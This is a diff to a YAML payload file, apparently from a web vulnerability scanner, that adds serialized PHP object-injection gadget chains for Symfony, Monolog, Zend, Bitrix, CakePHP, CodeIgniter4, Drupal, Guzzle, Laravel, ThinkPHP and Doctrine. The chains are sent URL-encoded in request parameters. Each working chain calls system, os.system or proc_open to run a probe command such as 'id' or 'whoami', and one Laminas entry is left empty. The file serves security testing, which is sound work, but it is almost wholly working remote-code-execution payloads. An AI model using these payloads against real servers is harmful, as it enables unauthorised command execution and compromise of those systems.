@@ -1,9 +1,33 @@
 payload:
+  # Symfony
   - 'O:43:"Symfony\Component\Cache\Adapter\ApcuAdapter":3:{s:64:"Symfony\Component\Cache\Adapter\AbstractAdaptermergeByLifetime";s:9:"proc_open";s:58:"Symfony\Component\Cache\Adapter\AbstractAdapternamespace";a:0:{}s:57:"Symfony\Component\Cache\Adapter\AbstractAdapterdeferred";s:6:"whoami";}'
   - 'O:11:"CDbCriteria":1:{s:6:"params";O:12:"CMapIterator":3:{s:16:"CMapIterator_d";O:10:"CFileCache":7:{s:9:"keyPrefix";s:0:"";s:7:"hashKey";b:0;s:10:"serializer";a:1:{i:1;s:9:"os.system";}s:9:"cachePath";s:10:"data:text/";s:14:"directoryLevel";i:0;s:11:"embedExpiry";b:1;s:15:"cacheFileSuffix";s:32:";base64,OTk5OTk5OTk5OXdob2FtaQ==";}s:19:"CMapIterator_keys";a:1:{i:0;i:0;}s:18:"CMapIterator_key";i:0;}}'
+  # WP-HTML-Token
   - 'O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:6:"whoami";s:10:"on_destroy";s:9:"os.system";}'
+  # Monolog/RCE9
+  - 'O:37:"Monolog\Handler\FingersCrossedHandler":4:{s:16:"*passthruLevel";E:19:"Monolog\Level:Debug";s:10:"*handler";r:1;s:9:"*buffer";a:1:{i:0;O:17:"Monolog\LogRecord":2:{s:5:"level";r:2;s:5:"mixed";s:2:"id";}}s:13:"*processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:6:"system";}}'
+  # Zend Framework/RCE5
+  - 'O:33:"Zend\Cache\Storage\Adapter\Memory":2:{s:15:"*eventHandles";a:1:{i:0;i:1;}s:9:"*events";O:30:"Zend\View\Renderer\PhpRenderer":1:{s:41:"Zend\View\Renderer\PhpRenderer__helpers";O:37:"Zend\Tag\Cloud\DecoratorPluginManager":4:{s:17:"*canonicalNames";a:2:{s:6:"detach";s:5:"cname";s:5:"cname";s:3:"any";}s:19:"*invokableClasses";a:1:{s:5:"cname";s:37:"Zend\Tag\Cloud\DecoratorPluginManager";}s:34:"*retrieveFromPeeringManagerFirst";b:0;s:15:"*initializers";a:1:{i:0;O:23:"Zend\Filter\FilterChain":1:{s:10:"*filters";O:13:"SplFixedArray":2:{i:0;a:2:{i:0;O:14:"Zend\Json\Expr":1:{s:13:"*expression";s:2:"id";}i:1;s:10:"__toString";}i:1;s:6:"system";}}}}}}'
+  # Bitrix/RCE1
+  - 'O:27:"Bitrix\Main\ORM\Data\Result":3:{s:9:"*errors";O:27:"Bitrix\Main\Type\Dictionary":1:{s:9:"*values";a:1:{i:0;O:17:"Bitrix\Main\Error":1:{s:10:"*message";O:36:"Bitrix\Main\UI\Viewer\ItemAttributes":1:{s:13:"*attributes";O:29:"Bitrix\Main\DB\ResultIterator":3:{s:38:"Bitrix\Main\DB\ResultIteratorcounter";i:0;s:42:"Bitrix\Main\DB\ResultIteratorcurrentData";i:0;s:37:"Bitrix\Main\DB\ResultIteratorresult";O:26:"Bitrix\Main\DB\ArrayResult":2:{s:11:"*resource";a:2:{i:0;a:1:{i:0;s:2:"id";}i:1;a:1:{i:0;a:1:{i:0;s:3:"rce";}}}s:13:"*converters";a:2:{i:0;s:6:"system";i:1;s:17:"WriteFinalMessage";}}}}}}}s:12:"*isSuccess";b:0;s:20:"*wereErrorsChecked";b:0;}'
+  # CAKEPHP/RCE2
+  - 'O:33:"Symfony\Component\Process\Process":4:{s:42:"Symfony\Component\Process\Processoptions";a:1:{s:18:"create_new_console";i:0;}s:47:"Symfony\Component\Process\ProcessprocessPipes";O:14:"Cake\ORM\Table":1:{s:13:"*_behaviors";O:25:"Cake\ORM\BehaviorRegistry":2:{s:13:"*_methodMap";a:1:{s:12:"readandwrite";a:2:{i:0;s:2:"mb";i:1;s:5:"fetch";}}s:10:"*_loaded";a:1:{s:2:"mb";O:41:"Cake\Database\Statement\CallbackStatement":2:{s:12:"*_callback";s:6:"system";s:13:"*_statement";O:41:"Cake\Database\Statement\BufferedStatement":3:{s:14:"*_allFetched";i:1;s:9:"*buffer";a:1:{i:0;s:2:"id";}s:8:"*index";i:0;}}}}}s:41:"Symfony\Component\Process\Processstatus";s:7:"started";s:42:"Symfony\Component\Process\Processprocess";i:1;}'
+  # CodeIgniter4/RCE6
+  - 'O:34:"Predis\Response\Iterator\MultiBulk":3:{s:11:"*position";i:0;s:7:"*size";i:1;s:46:"Predis\Response\Iterator\MultiBulkconnection";O:20:"Faker\ValidGenerator":3:{s:12:"*generator";O:22:"Faker\DefaultGenerator":1:{s:10:"*default";s:2:"id";}s:13:"*maxRetries";i:1;s:12:"*validator";s:6:"system";}}'
+  # Drupal/RCE1
+  - 'O:31:"GuzzleHttp\Cookie\FileCookieJar":1:{s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";O:32:"Laminas\Diactoros\RelativeStream":1:{s:49:"Laminas\Diactoros\RelativeStreamdecoratedStream";O:26:"GuzzleHttp\Psr7\PumpStream":2:{s:34:"GuzzleHttp\Psr7\PumpStreamsource";s:1:"1";s:34:"GuzzleHttp\Psr7\PumpStreambuffer";O:32:"Drupal\Core\Config\CachedStorage":2:{s:10:"*storage";O:32:"Drupal\Core\Config\MemoryStorage":1:{s:13:"*collection";s:0:"";}s:8:"*cache";O:46:"Drupal\Component\DependencyInjection\Container":1:{s:21:"*serviceDefinitions";a:1:{i:1000000;s:68:"a:2:{s:7:"factory";s:6:"system";s:9:"arguments";a:1:{i:0;s:2:"id";}}";}}}}}}'
+  # Guzzle/RCE1
+  - 'O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"GuzzleHttp\Psr7\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}'
+  # Laravel/RCE22
+  - 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:41:"League\CommonMark\Environment\Environment":2:{s:64:"League\CommonMark\Environment\EnvironmentextensionsInitialized";b:1;s:55:"League\CommonMark\Environment\EnvironmentlistenerData";O:38:"League\CommonMark\Util\PrioritizedList":1:{s:44:"League\CommonMark\Util\PrioritizedListlist";a:1:{i:0;a:1:{i:0;O:36:"League\CommonMark\Event\ListenerData":2:{s:43:"League\CommonMark\Event\ListenerDataevent";s:32:"\Illuminate\Broadcasting\Channel";s:46:"League\CommonMark\Event\ListenerDatalistener";O:54:"Illuminate\Support\Testing\Fakes\ChainedBatchTruthTest":1:{s:11:"*callback";s:6:"system";}}}}}}s:8:"*event";O:31:"Illuminate\Broadcasting\Channel":1:{s:4:"name";s:2:"id";}}'
+  # ThinkPHP/RCE4
+  - 'O:17:"think\model\Pivot":9:{s:19:"think\Modelexists";b:1;s:18:"think\Modelforce";b:1;s:21:"think\ModellazySave";b:1;s:9:"*suffix";O:17:"think\model\Pivot":9:{s:19:"think\Modelexists";N;s:18:"think\Modelforce";N;s:21:"think\ModellazySave";N;s:9:"*suffix";N;s:17:"think\Modeldata";a:1:{s:3:"key";a:1:{s:3:"key";s:2:"id";}}s:21:"think\ModelwithAttr";a:1:{s:3:"key";a:1:{s:3:"key";s:6:"system";}}s:7:"*json";a:1:{i:0;s:3:"key";}s:12:"*jsonAssoc";b:1;s:12:"*withEvent";N;}s:17:"think\Modeldata";a:1:{s:3:"key";a:1:{s:3:"key";s:2:"id";}}s:21:"think\ModelwithAttr";N;s:7:"*json";N;s:12:"*jsonAssoc";N;s:12:"*withEvent";b:0;}'
+  # Doctrine/RCE2
+  - 'O:39:"Doctrine\Common\Cache\Psr6\CacheAdapter":2:{s:13:"deferredItems";a:1:{i:0;O:41:"Symfony\Component\Cache\Traits\RedisProxy":2:{s:5:"redis";s:6:"whoami";s:11:"initializer";O:61:"Doctrine\Bundle\DoctrineBundle\Dbal\SchemaAssetsFilterManager":1:{s:18:"schemaAssetFilters";a:1:{i:0;s:6:"system";}}}}s:6:"loader";i:1;}'
+  # Laminas/FD1
+  - ''
 encoder:
-  - URL
+  - URLEncode
 placeholder:
   - URLParam
 type: DeserializePHP
